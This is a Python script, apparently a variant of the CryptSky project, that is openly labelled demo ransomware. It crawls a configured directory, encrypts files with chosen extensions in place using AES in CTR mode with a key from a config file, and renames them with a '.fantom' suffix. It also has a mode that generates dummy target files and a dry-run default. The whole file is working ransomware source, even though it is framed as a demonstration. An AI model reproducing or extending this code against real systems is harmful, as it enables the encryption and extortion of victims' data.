#!/usr/bin/env python
#
# based on:
# https://github.com/deadPix3l/CryptSky
#
#
import argparse
import configparser
import os
import random
import sys

from Crypto.Cipher import AES
from Crypto.Util import Counter

import helper

parser = argparse.ArgumentParser(description='CryptskyReloaded')
parser.add_argument('-c', '--config', help='Config file', required=True)
parser.add_argument('-g', '--generatefiles', help='Generate files', action='store_true')
parser.add_argument('-d', '--doit', help='Really encrypt files', action='store_true')

args = parser.parse_args()

config = configparser.ConfigParser()
try:
    config.read(args.config)
except Exception as e:
    print("Error reading config file: %s" % (e))

# generate files to decrypt
if args.generatefiles:
    file_extensions = config["GENERATE_FILES"]["EXTENSIONS"].split(",")
    for i in range(0, int(config["GENERATE_FILES"]["FILES_TO_GENERATE"])):
        fn = "%s_%s.%s" % (
            config["DEFAULT"]["PATH"] + os.sep + config["GENERATE_FILES"]["FILENAME"], i,
            random.choice(file_extensions))
        print("Generating file %s" % (fn))
        try:
            with open(fn, "w") as file:
                file.write(helper.randtext())
        except Exception as e:
            print("Error creating file %s: %s" % (fn, e))
    sys.exit(0)

key = config["DEFAULT"]["KEY"].encode()

print(
    "This is a demo ransomware. Basically it only encrypts files from a specific directory. If you accidently encrypted"
    "important files, just run this script again! To really encrypt files, use the -d parameter!\nEncryption Key is: %s\n\n" % (
        str(key)))

# use AES CTR mode
ctr = Counter.new(128)
crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

# change this to fit your needs.
startdirs = config["DEFAULT"]["PATH"]

for file in helper.discoverFiles(startdirs, config["DEFAULT"]["ENCRYPT_EXTENSIONS"].split(",")):
    if args.doit:
        print("Encrypting file %s" % (file))
        try:
            helper.modify_file_inplace(file, crypt.encrypt)
        except Exception as e:
            print("Error encrypting file %s: %s" % (file, e))

        if config["DEFAULT"]["RENAME_FILES"] == "True":
            try:
                os.rename(file, file + '.fantom')  # append filename to indicate crypted4
            except Exception as e:
                print("Error renaming file %s: %s" % (file, e))
    else:
        print("WOULD encrypt file %s" % (file))
